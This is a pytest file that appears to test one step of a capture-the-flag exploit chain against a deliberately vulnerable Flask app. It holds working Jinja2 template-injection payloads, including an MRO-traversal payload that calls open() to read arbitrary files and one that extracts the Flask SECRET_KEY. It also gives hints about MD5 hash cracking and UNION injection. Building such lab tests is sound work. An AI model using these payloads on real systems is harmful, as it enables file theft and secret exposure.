"""
SSTI checks — chain step 2.

Verifies the Server-Side Template Injection vulnerability on /search and the
two file-read payloads that advance the chain:
  - app/api/users.py   → contains the MD5/staff_messages developer comments
  - app/logs/deploy.log → contains the DEBUG line that leaks the passphrase path

The SSTI exists because search.py inserts the raw query string into an f-string
that is then passed to render_template_string — Jinja2 executes the injected
template expressions before the response is returned.

This file extends (does not replace) the existing test_ssti.py tests.
"""
import urllib.parse
import pytest

# ---------------------------------------------------------------------------
# CONFIG — adjust payloads and expected strings here
# ---------------------------------------------------------------------------
CONFIG = {
    # Basic arithmetic proof-of-concept
    "arithmetic_payload": "{{7*7}}",
    "arithmetic_expected": b"49",

    # File-read payload template — {} is replaced with the target path
    # Uses Jinja2 MRO traversal to reach open()
    "file_read_template": (
        "{{% for c in [].__class__.__mro__[1].__subclasses__() %}}"
        "{{% if c.__name__ == 'catch_warnings' %}}"
        "{{{{ c()._module.__builtins__['open']('{path}').read() }}}}"
        "{{% endif %}}"
        "{{% endfor %}}"
    ),

    # Target 1: API source file (must contain these strings after read)
    "users_py_path": "app/api/users.py",
    "users_py_expected": [
        b"CERODIAS-431",          # MD5 migration comment
        b"staff_messages",        # table name hint
    ],

    # Target 2: deploy log (must contain the DEBUG passphrase line)
    "deploy_log_path": "app/logs/deploy.log",
    "deploy_log_expected": [
        b"DEBUG",
        b"/var/cerodias/deploy.key",
    ],
}


def _ssti_url(payload: str) -> str:
    """URL-encode an SSTI payload for use as the ?q= parameter."""
    return f"/search?q={urllib.parse.quote(payload)}"


def _file_read_url(path: str) -> str:
    """Build the full /search URL for a file-read payload targeting *path*."""
    payload = CONFIG["file_read_template"].format(path=path)
    return _ssti_url(payload)


class TestSSTIBasic:
    """Basic SSTI confirmation — Jinja2 template expressions are evaluated."""

    def test_arithmetic_expression_evaluated(self, authed_client):
        """{{7*7}} renders as 49 in the response body."""
        resp = authed_client.get(_ssti_url(CONFIG["arithmetic_payload"]))
        assert resp.status_code == 200
        assert CONFIG["arithmetic_expected"] in resp.data

    def test_plain_text_reflected_without_evaluation(self, authed_client):
        """Non-template input is reflected as-is (confirms template is rendered)."""
        resp = authed_client.get("/search?q=helloworld")
        assert resp.status_code == 200
        assert b"helloworld" in resp.data

    def test_config_object_accessible(self, authed_client):
        """{{config.DEBUG}} evaluates — Flask context is exposed."""
        resp = authed_client.get(_ssti_url("{{config.DEBUG}}"))
        assert resp.status_code == 200
        # Raw {{ must NOT appear in output — confirms evaluation happened
        assert b"{{" not in resp.data

    def test_secret_key_extractable(self, authed_client):
        """{{config.SECRET_KEY}} exposes the static dev secret key."""
        resp = authed_client.get(_ssti_url("{{config.SECRET_KEY}}"))
        assert resp.status_code == 200
        # The static key from config.py (DIFFICULTY=0)
        assert b"flask-2b7f3a9c8d1e4f6a" in resp.data


class TestSSTIFileRead:
    """
    File-read chain via MRO traversal.

    These tests verify that the two files required for the chain are both
    readable via SSTI and contain the expected chain-critical strings.
    """

    def test_users_py_is_readable(self, authed_client):
        """SSTI can read app/api/users.py — confirms arbitrary file read."""
        resp = authed_client.get(_file_read_url(CONFIG["users_py_path"]))
        assert resp.status_code == 200

    def test_users_py_contains_md5_comment(self, authed_client):
        """
        app/api/users.py read via SSTI reveals CERODIAS-431 (MD5 migration comment).
        This tells the player j.harris is on a legacy MD5 hash — crackable with rockyou.
        """
        resp = authed_client.get(_file_read_url(CONFIG["users_py_path"]))
        assert CONFIG["users_py_expected"][0] in resp.data, (
            "CERODIAS-431 comment not found in SSTI file read of app/api/users.py"
        )

    def test_users_py_contains_staff_messages_hint(self, authed_client):
        """
        app/api/users.py read via SSTI reveals 'staff_messages' table name.
        This is the UNION injection target — players now know which table to pivot to.
        """
        resp = authed_client.get(_file_read_url(CONFIG["users_py_path"]))
        assert CONFIG["users_py_expected"][1] in resp.data, (
            "staff_messages hint not found in SSTI file read of app/api/users.py"
        )

    def test_deploy_log_is_readable(self, authed_client):
        """SSTI can read app/logs/deploy.log."""
        resp = authed_client.get(_file_read_url(CONFIG["deploy_log_path"]))
        assert resp.status_code == 200

    def test_deploy_log_contains_debug_line(self, authed_client):
        """
        app/logs/deploy.log read via SSTI reveals the DEBUG line.
        This line names /var/cerodias/deploy.key — the RCE read target.
        """
        resp = authed_client.get(_file_read_url(CONFIG["deploy_log_path"]))
        for expected in CONFIG["deploy_log_expected"]:
            assert expected in resp.data, (
                f"{expected!r} not found in SSTI file read of app/logs/deploy.log"
            )
